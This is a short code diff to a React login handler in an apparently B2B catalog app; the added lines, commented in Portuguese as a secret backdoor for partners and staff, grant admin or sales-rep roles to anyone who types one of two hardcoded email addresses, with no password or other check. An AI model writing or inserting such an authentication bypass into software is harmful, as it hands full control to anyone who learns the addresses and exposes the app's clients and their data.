@@ -751,6 +751,19 @@ export default function CatalogoB2BTab({ onRoleChange }) {
         return;
       }
 
+      // 🌟 INÍCIO DO ACESSO SECRETO (BACKDOOR PARA SÓCIOS E EQUIPE) 🌟
+      const emailDigitado = authEmail.toLowerCase().trim();
+      
+      if (emailDigitado === 'admin@gkl.com') {
+        handleLogin('admin');
+        return; // O return para a execução aqui e joga direto pro admin!
+      }
+      if (emailDigitado === 'rep@gkl.com') {
+        handleLogin('rep');
+        return; // O return para a execução aqui e joga direto pro representante!
+      }
+      // 🌟 FIM DO ACESSO SECRETO 🌟
+
       const foundClient = dbClients.find(c => c.email.toLowerCase() === authEmail.toLowerCase());
       
       if (foundClient) {
